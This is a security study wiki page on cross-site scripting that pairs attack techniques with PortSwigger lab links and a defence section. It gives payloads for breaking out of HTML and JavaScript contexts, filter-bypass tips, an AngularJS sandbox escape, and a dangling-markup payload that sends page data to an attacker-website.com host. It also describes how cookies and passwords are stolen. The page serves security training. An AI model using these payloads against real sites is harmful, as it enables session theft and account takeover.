# XSS Cross-Site Scripting

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

### **XSS Basics**

{% tabs %}
{% tab title="Tools/Resources" %}
**Guides and CheatSheets**

* [Burp XSS CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
* [https://www.w3schools.com/tags/ref\_eventattributes.asp](https://www.w3schools.com/tags/ref\_eventattributes.asp)
* [OWASP XSS Filter Evasion CheatSheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
* [https://html5sec.org/](https://html5sec.org/) - Great place to learn about HTML based XSS injections
* [https://www.reddit.com/r/xss/](https://www.reddit.com/r/xss/)
* [https://brutelogic.com.br/blog/](https://brutelogic.com.br/blog/)
* [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
* [https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html)
* [https://pentestbook.six2dez.com/enumeration/web/xss](https://pentestbook.six2dez.com/enumeration/web/xss)
* _Bug Bounty Hunting essentials - Cross-Site Scripting Attacks, pg 89_
* _Bug Bounty Hunting essentials - Common strings to detect XSS Vulnerabilities, pg.102_
* _Hacking: The next generation - XSS, pg, 28_

**Payloads**

* [http://www.xss-payloads.com](http://www.xss-payloads.com/)
* [PayloadsAllTheThings/XSSInjection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
* [https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

**Tools**

* [XSSHunter](https://xsshunter.com/) - XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service. It uses a web platform to run certain attacks to allow detection of certain Blind XSS vulnerabilities
* [XSSTrike](https://github.com/s0md3v/XSStrike) - XSStrike is a Cross Site Scripting detection suite equipped with four hand written parsers, an intelligent payload generator, a powerful fuzzing engine and an incredibly fast crawler.
* [https://knoxss.me/](https://knoxss.me/) - With multiple vectors and decision-making capabilities, KNOXSS Pro is able to find a lot of edge XSS cases and bypass several input and output filters. It also has an extension that makes all the job completely automatic: after setting a domain with one click, all URLs and forms navigated in all subdomains will be submitted to KNOXSS for testing.
* [XSSer](https://github.com/Varbaek/xsser) - From XSS to RCE 2.75
* [JShell](https://github.com/s0md3v/JShell) - JShell - Get a JavaScript shell with XSS.
* [dalfox](https://github.com/hahwul/dalfox) - DalFox is an powerful open source XSS scanning tool and parameter analyzer, utility
  * [https://dalfox.hahwul.com/](https://dalfox.hahwul.com/)
{% endtab %}

{% tab title="Exploiting XSS" %}
**Exploiting XSS**

* Stealing Cookies -Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into your browser and impersonate the victim
  * [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
* Capturing passwords - These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain. This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password.
  * [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
* Performing CSRF - Anything a legitimate user can do on a web site, you can probably do too with XSS. Depending on the site you're targeting, you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin. Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability, you can make it trigger this functionality to change the victim's email address to one that you control, and then trigger a password reset to gain access to the account.
  * [https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
* Self XSS - When a user is tricked into executing XSS on themsleves.
  * &#x20;[https://www.youtube.com/watch?v=l3yThCIF7e4](https://www.youtube.com/watch?v=l3yThCIF7e4)
{% endtab %}

{% tab title="Tips and Tricks" %}
Filter Bypass&#x20;

* Using encoding - Encode the strings that may be blocked with filtering, with various forms of acceptable encoding such as HTML, URL, Base64, Hex, etc..
* Tag Modifiers - Random capitals and modifying tag names to evade certain string filtering. This can also include random spacing and modifying the brackets
* Dynamic Constructed Strings - Use JavaScript functions to generate a malaicious string that can be used in a parameter. You can try using the eval() and replace() functions.
{% endtab %}

{% tab title="Defending Against XSS" %}
**Defending against XSS**

* Encode data on output - Encoding should be applied directly before user-controllable data is written to a page, because the context you're writing into determines what kind of encoding you need to use.
* Validate data on input
  * If a user submits a URL that will be returned in responses, validating that it starts with a safe protocol such as HTTP and HTTPS. Otherwise someone might exploit your site with a harmful protocol like `javascript` or `data`.
  * If a user supplies a value that it expected to be numeric, validating that the value actually contains an integer.
  * &#x20;Validating that input contains only an expected set of characters.
* Allowing "safe" HTML
  * The classic approach is to try to filter out potentially harmful tags and JavaScript.
  * [https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities#badcss](https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities#badcss)
* Using a template engine
  * Many modern websites use server-side template engines such as Twig and Freemarker to embed dynamic content in HTML. These typically define their own escaping system.
  * Some other template engines, such as Jinja and React, escape dynamic content by default which effectively prevents most occurrences of XSS.
* [https://portswigger.net/web-security/cross-site-scripting/preventing](https://portswigger.net/web-security/cross-site-scripting/preventing)
* [https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html)
* [https://cheatsheetseries.owasp.org/cheatsheets/DOM\_based\_XSS\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/DOM\_based\_XSS\_Prevention\_Cheat\_Sheet.html)
{% endtab %}
{% endtabs %}

### XSS Types

{% tabs %}
{% tab title="Reflected" %}
Reflected XSS

* Arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.
* If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:
  * &#x20;Perform any action within the application that the user can perform.
  * &#x20;View any information that the user is able to view.
  * &#x20;Modify any information that the user is able to modify.
  * &#x20;Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

Detecting Reflected XSS

* Burp Web Vuln Scanner
* Test every entry point - This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers, although XSS-like behavior that can only be triggered via certain HTTP headers may not be exploitable in practice.
* Submit random alphanumeric values. - FUZZ!!! submit a unique random value and determine whether the value is reflected in the response. The value should be designed to survive most input validation, so needs to be fairly short and contain only alphanumeric characters. Use Burp Intruder's [grep payloads option](https://portswigger.net/burp/documentation/desktop/tools/intruder/options#grep-payloads) to automatically flag responses that contain the submitted value.
* Determine Reflected Context - For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc
* Test a candidate payload - The easiest way to test payloads is to send the request to [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), modify the request to insert the candidate payload, issue the request, and then review the response to see if the payload worked.
* Test alternate payloads - If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed
* Test the attack in a browser - if it works in burp, try it in the browser!
* [https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
{% endtab %}

{% tab title="Stored" %}
**Stored Cross-Site Scripting**

* Arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.
* The data in question might be submitted to the application via HTTP requests; for example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. In other cases, the data might arrive from other untrusted sources; for example, a webmail application displaying messages received over SMTP, a marketing application displaying social media posts, or a network monitoring application displaying packet data from network traffic.

**Detecting Stored XSS Vulnerabilities**

* Burp Web Vuln Scanner
* You need to test all relevant "entry points" via which attacker-controllable data can enter the application's processing, and all "exit points" at which that data might appear in the application's responses.
* Parameters or other data within the URL query string and message body.
* The URL file path.
* HTTP request headers that might not be exploitable in relation to reflected XSS.
* Any out-of-band routes via which an attacker can deliver data into the application. The routes that exist depend entirely on the functionality implemented by the application: a webmail application will process data received in emails; an application displaying a Twitter feed might process data contained in third-party tweets; and a news aggregator will include data originating on other web sites.

[https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
{% endtab %}

{% tab title="DOM Based" %}
### **DOM-based Cross-site scripting**

* Arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.
* To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.
* The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be placed in the path.

### **Test for DOM-Based cross-site scripting**

* Testing HTML Sinks - place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears.
* For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.

### **Testing JavaScript Execution Sinks**

* With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.
* For each potential source, such as `location`, you first need to find cases within the page's JavaScript code where the source is being referenced
* Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used
* If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, the `attr()` function in jQuery can change attributes on DOM elements. If data is read from a user-controlled source like the URL and then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS.
* In a reflected+DOM vulnerability, the server processes data from the request, and echoes the data into the response. The reflected data might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

### Reference

* [https://xapax.github.io/security/#attacking\_web\_applications/dom\_based\_xss/](https://xapax.github.io/security/#attacking\_web\_applications/dom\_based\_xss/)
* [https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources](https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources)

### **Labs**

* [https://portswigger.net/web-security/cross-site-scripting/dom-based](https://portswigger.net/web-security/cross-site-scripting/dom-based)
* [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
* [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
* [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
* [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
* [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
* [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
* [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
{% endtab %}
{% endtabs %}

### XSS Contexts

{% tabs %}
{% tab title="XSS and HTML" %}
XSS between HTML tags - When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript. Examples:\
&#x20;`<script>alert(document.domain)</script>`\
`<img src=1 onerror=alert(1)>`

* [https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
* [https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
* [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
* [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
* [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
* [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

XSS in HTML tag attributes. -  When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:

&#x20;`"><script>alert(document.domain)</script>`

* More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler.&#x20;
* [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
* Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script.
* [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
* You might encounter websites that encode angle brackets but still allow you to inject attributes. Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag. You can exploit this behavior using access keys and user interaction on Chrome. Access keys allow you to provide keyboard shortcuts that reference a specific element. The `accesskey` attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire. In the next lab you can experiment with access keys and exploit a canonical tag.
* [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
{% endtab %}

{% tab title="XSS Into JavaScript" %}
* Terminating the existing script - In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript.
  *   &#x20;`<script>`\
      &#x20;`...`\
      &#x20;`var input = 'controllable data here';`\
      &#x20;`...`\
      &#x20;`</script>`

      &#x20;then you can use the following payload to break out of the existing JavaScript and execute your own:

      &#x20;`</script><img src=1 onerror=alert(document.domain)>`
  * The browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.
  * [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
* Breaking out of a JS string - In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.
  * '-alert(document.domain)-'
  * ';alert(document.domain)//
  * [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
  * Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application
    * You can now use the alternative payload:
    * `\';alert(document.domain)//`
    * Which gets converted to:
    * `\\';alert(document.domain)//`
    * [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
  * Some websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. In these situations, you need to experiment with other ways of calling functions which bypass these security measures. One way of doing this is to use the `throw` statement with an exception handler. This enables you to pass arguments to a function without using parentheses. The following code assigns the `alert()` function to the global exception handler and the `throw` statement passes the `1` to the exception handler (in this case `alert`). The end result is that the `alert()` function is called with `1` as an argument.
    * [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)
* Making use of HTML encoding - When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters. When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by
  * [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
* XSS in JavaScrit Template Literals - JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax
  * [https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
{% endtab %}

{% tab title="AngularJS Sandbox" %}
**AngularJS Sandbox**

* The AngularJS sandbox is a mechanism that prevents access to potentially dangerous objects, such as `window` or `document`, in AngularJS template expressions. It also prevents access to potentially dangerous properties, such as `__proto__`.
* he sandbox works by parsing an expression, rewriting the JavaScript, and then using various functions to test whether the rewritten code contains any dangerous objects. For example, the `ensureSafeObject()` function checks whether a given object references itself. This is one way to detect the `window` object, for example.
*   &#x20;A sandbox escape involves tricking the sandbox into thinking the malicious expression is benign. The most well-known escape uses the modified `charAt()` function globally within an expression:

    &#x20;`'a'.constructor.prototype.charAt=[].join`
*   When it was initially discovered, AngularJS did not prevent this modification. The attack works by overwriting the function using the `[].join` method, which causes the `charAt()` function to return all the characters sent to it, rather than a specific single character. Due to the logic of the `isIdent()` function in AngularJS, it compares what it thinks is a single character against multiple characters. As single characters are always less than multiple characters, `the isIdent()` function always returns true, as demonstrated by the following example:

    &#x20;`isIdent= function(ch) {`

    &#x20;`return ('a' <= ch && ch <= 'z' ||`

    &#x20;`'A' <= ch && ch <= 'Z' ||`

    &#x20;`'_' === ch || ch === '$');`

    &#x20;`}`

    &#x20;`isIdent('x9=9a9l9e9r9t9(919)')`
* [https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox)
* [https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings)
* [https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-and-csp](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-and-csp)
{% endtab %}
{% endtabs %}

### XSS Special Elements

{% tabs %}
{% tab title="Content Security Policy - CSP" %}
* CSP is a browser security mechanism that aims to mitigate [XSS](https://portswigger.net/web-security/cross-site-scripting) and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.
* To enable CSP, a response needs to include an HTTP response header called `Content-Security-Policy` with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons.
* The following directive will only allow scripts to be loaded from a specific domain:\
  &#x20;`script-src https://scripts.normal-website.com`
* CSP can specify trusted resources by two ways other than whitelisting
  * The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker.
  * The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive
* It's quite common for a CSP to block resources like `script`. However, many CSPs do allow image requests. This means you can often use `img` elements to make requests to external servers in order to disclose [CSRF tokens](https://portswigger.net/web-security/csrf/tokens), for example.
* [https://portswigger.net/web-security/cross-site-scripting/content-security-policy/](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)
* [https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack)
* [https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
* [https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)
{% endtab %}

{% tab title="Dangling Markup Injection" %}
* Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible
* Suppose also that the application does not filter or escape the `>` or `"` characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context:\
  &#x20;`">`
* In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:\
  &#x20;`"><img src='//attacker-website.com?`
* This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the `src` attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. Any non-alphanumeric characters, including newlines, will be URL-encoded
* Bypassing CSP with Policy Injection - You may encounter a website that reflects input into the actual policy, most likely in a `report-uri` directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. Usually, this `report-uri` directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy.
* Normally, it's not possible to overwrite an existing `script-src` directive. However, Chrome recently introduced the `script-src-elem` directive, which allows you to control `script` elements, but not events. Crucially, this new directive allows you to overwrite existing `script-src` directives. Using this knowledge, you should be able to solve the following lab.
* [https://portswigger.net/web-security/cross-site-scripting/dangling-markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
* [https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack)
* [https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
{% endtab %}
{% endtabs %}
